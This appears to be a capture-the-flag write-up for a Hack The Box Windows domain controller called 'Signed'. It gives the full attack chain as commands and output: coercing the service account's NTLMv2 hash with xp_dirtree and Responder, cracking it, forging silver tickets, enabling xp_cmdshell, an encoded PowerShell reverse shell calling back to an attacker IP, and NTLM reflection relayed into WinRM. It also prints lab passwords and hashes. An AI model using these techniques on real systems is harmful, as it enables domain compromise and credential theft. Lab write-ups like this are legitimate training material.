---
title: Signed
date: 2026-07-23
description: Medium Windows AD machine exposing only MSSQL with assumed-breach credentials — coercing the service account's NetNTLMv2 hash through xp_dirtree, forging silver tickets for sysadmin command execution, and abusing NTLM reflection to relay the DC's authentication into WinRM.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

Assumed breach — MSSQL service credentials provided:

```text
scott / Sm230#C5NatH
```

```sh
# Nmap 7.98 scan initiated Mon Jul 20 05:40:26 2026 as: /usr/lib/nmap/nmap -p1433 -A -oN scan_results.txt signed.htb
Nmap scan report for signed.htb (10.129.242.173)
Host is up (0.64s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-07-20T09:41:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-20T09:28:45
|_Not valid after:  2056-07-20T09:28:45
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1433/tcp)
HOP RTT       ADDRESS
1   497.89 ms 10.10.16.1
2   748.49 ms signed.htb (10.129.242.173)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 20 05:41:07 2026 -- 1 IP address (1 host up) scanned in 41.06 seconds

```

## mssql-enumeration

```sh
impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.129.242.173 
```

**Primary goal**: a silver ticket for Administrator — the account with unrestricted access to run system commands through `xp_cmdshell`.

Requirements:
- A `dbo` account — the user running the MSSQL service
- The domain ID of Administrator, found in the SID of the Administrator principal

# User

## Coercing the service account

To identify the `dbo` user, point `xp_dirtree` at an attacker-controlled share with `responder` listening:

```sh
responder -I tun0
```

```text
exec master..xp_dirtree '\\10.10.17.32\share\'
```

Responder intercepted the SMB authentication:

```sh
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:7fbc7d624a15ccfd:0DC54722ABB0CBC158F1BD3620B15432:0101000000000000004C9AFB2618DD0107FC1A63D3C547940000000002000800560037003600460001001E00570049004E002D003400440037003600480055004C00490030003800540004003400570049004E002D003400440037003600480055004C0049003000380054002E0056003700360046002E004C004F00430041004C000300140056003700360046002E004C004F00430041004C000500140056003700360046002E004C004F00430041004C0007000800004C9AFB2618DD0106000400020000000800300030000000000000000000000000300000F25D89E15997ACDD63CC190AA192F37276CE941C89DDB8E2C949176382DA22C40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00330032000000000000000000

```

Cracked the NetNTLMv2 hash with `john`:

```sh
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvchash
```

> `mssqlsvc ~ purPLE9795!@`

## SID harvesting

With the service account, enumerate domain users via RID bruteforce:

```sh
nxc mssql 10.129.242.173 -u "SIGNED\mssqlsvc" -p 'purPLE9795!@' --rid-brute 

oliver.mills
emma.clark
liam.wright
noah.adams
ava.morris
sophia.turner
james.morgan
mia.cooper
elijah.brooks
isabella.evans
lucas.murphy
william.johnson
charlotte.price
henry.bennett
amelia.kelly
jackson.gray
harper.diaz
```

Back in the database as `scott`, pull Administrator's SID:

```sql
SELECT SUSER_SID('SIGNED\Administrator');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
```

**SID** hex strings are stored as **varbinary(85)**, so we convert them with a small helper:

```python
#!/usr/bin/env python3
"""
sid_from_hex.py

Prompts for a hex string (as stored in a varbinary(85) SID column,
e.g. SQL Server's sys.server_principals.sid) and converts it into
the human-readable SID format: S-REV-AUTH-SUB1-SUB2-...

Binary layout of a Windows SID:
  byte 0        : Revision (usually 1)
  byte 1        : Sub-authority count (N)
  bytes 2-7     : Identifier Authority (6 bytes, big-endian)
  bytes 8...    : N sub-authorities, each 4 bytes, little-endian
"""

import struct


def hex_to_sid(hex_str: str) -> str:
    """Convert a hex string to a Windows SID string."""
    cleaned = hex_str.strip().lower().removeprefix("0x").replace(" ", "")

    if len(cleaned) % 2 != 0:
        raise ValueError("Hex string has an odd number of characters — it looks incomplete.")

    try:
        data = bytes.fromhex(cleaned)
    except ValueError as e:
        raise ValueError(f"Invalid hex string: {e}")

    if len(data) < 8:
        raise ValueError("Too short to be a valid SID (need at least 8 bytes).")

    revision = data[0]
    sub_authority_count = data[1]

    # Identifier authority: 6 bytes, big-endian
    identifier_authority = int.from_bytes(data[2:8], byteorder="big")

    expected_len = 8 + (4 * sub_authority_count)
    if len(data) < expected_len:
        raise ValueError(
            f"Data too short: expected at least {expected_len} bytes "
            f"for {sub_authority_count} sub-authorities, got {len(data)}."
        )

    sub_authorities = []
    offset = 8
    for _ in range(sub_authority_count):
        (value,) = struct.unpack_from("<I", data, offset)  # little-endian uint32
        sub_authorities.append(value)
        offset += 4

    sid_parts = "-".join(str(x) for x in sub_authorities)
    return f"S-{revision}-{identifier_authority}-{sid_parts}"


def main() -> None:
    user_input = input("Enter the hex string (varbinary SID): ")

    try:
        result = hex_to_sid(user_input)
        print(f"SID: {result}")
    except ValueError as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    main()

```

The final component is Administrator's **RID** (500) — formatted as `group id + rid`:

```text
SID: S-1-5-21-4088429403-1159899800-2753317549-500
```

That gives us both requirements: the `dbo` username and password, and the domain ID of Administrator. Now forge a fresh NTLM hash to impersonate:

```sh
pypykatz crypto nt 'purPLE9795!@'
```

## Silver ticket

**impacket-ticketer** crafts a ticket impersonating Administrator:

```sh
impacket-ticketer -spn MSSQLSVC/dc01.signed.htb -domain-sid  S-1-5-21-4088429403-1159899800-2753317549 -nthash ef699384c3285c54128a3ee1ddb1a0cc -dc-ip 10.129.242.173 -domain signed.htb Administrator
```

Export the resulting cache file and add `DC01.signed.htb` to hosts:

```sh
export KRB5CCNAME = Administrator.ccache
```

```sh
impacket-mssqlclient -k DC01.signed.htb
```

`-k` — Kerberos authentication using credentials from the ccache file (`KRB5CCNAME`).

Logged in as Administrator — but still carrying guest-level privilege, so we check which login holds `sysadmin`:

```sql
SELECT sp.name, sl.name AS LoginName FROM sys.server_role_members rm JOIN sys.server_principals sp ON rm.role_principal_id = sp.principal_id JOIN sys.server_principals sl ON rm.member_principal_id = sl.principal_id WHERE sp.name='sysadmin';
```

`SIGNED\IT` held the sysadmin role. Grab its SID and use the group's RID:

```SQL
SELECT SUSER_SID('SIGNED\IT');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

Converted from varbinary(85):

```text
S-1-5-21-4088429403-1159899800-2753317549-1105
```

Forge the ticket again — this time embedding the IT group:

```sh
impacket-ticketer -spn MSSQLSVC/dc01.signed.htb -domain-sid  S-1-5-21-4088429403-1159899800-2753317549 -nthash ef699384c3285c54128a3ee1ddb1a0cc -dc-ip 10.129.242.173 -domain signed.htb -groups 1105 Administrator
```

```sh
export KRB5CCNAME = Administrator.ccache
```

Reconnect over Kerberos — now with sysadmin:

```sh
impacket-mssqlclient -k DC01.signed.htb
```

Verified with:

```sql
select user_name();
```

With dbo-level privileges, enable `xp_cmdshell` through `sp_configure`:

```sql
exec sp_configure 'advanced options', 1;

reconfigure;

exec sp_configure 'xp_cmdshell', 1;

reconfigure;
```

And catch the reverse shell:

```sql
exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMwAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

Gained foothold as user.

Several internal services were running — including WinRM on `5986`. Forwarded the internal network with ligolo:

```text
nxc smb 240.0.0.1 -u 'mssqlsvc' -p 
```

# Root

## NTLM reflection

SMB signing is enabled by default on the domain controller — classic relaying is off the table. Recent research showed cross-platform self-relaying still works through an NTLM reflection attack even with signing enforced.

> Note: Issue in active directory service discovered using `nxc` tool
>
> https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025

In a typical NTLM reflection attack, the attacker opens a connection to a target service and receives an NTLM challenge — a random value the server sends to verify identity. That challenge is then reflected back to a legitimate user or system trying to authenticate to the attacker, who unknowingly signs it with their own NTLM credentials. The attacker captures the signed response and relays it back to the original target service, impersonating the legitimate user.

Exploitation methodology: first, **add** a **DNS entry** pointing back to us, in the **format** `<MACHINE NAME>+1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`:

```text
# localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# signed1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

Next, start **ntlmrelayx** to relay the coerced authentication. What are we relaying it to? The possibilities were `MSSQL`, `ESC8`, and **WinRMS** — WinRMS looked interesting, since relaying to MSSQL was pointless when we already had sysadmin. Finally, coerce the target using the DNS entry we just added.

Once complete, ntlmrelayx's output confirms success — with a WinRM shell available on **127.0.0.1:11000**.

## Exploitation

Plant the DNS entry with dnstool:

```sh
dnstool -u 'SIGNED\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.17.32 240.0.0.1
```

Start **ntlmrelayx** with a WinRM target:

```text
impacket-ntlmrelayx -t winrms://240.0.0.1 -smb2support
```

The **coerce_plus** module triggers the NTLM relay — it deals with NTLM authentication, not Kerberos:

```text
nxc smb 240.0.0.1 -u 'mssqlsvc' -p 'purPLE9795!@' -m coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=pe
```

The target was vulnerable — ntlmrelayx received the WinRM connection and forwarded it to localhost:1100 with administrator-level NTLM authentication. We then connected to the forwarded WinRM service and upgraded to a proper shell with a reverse payload.

Gained `root`
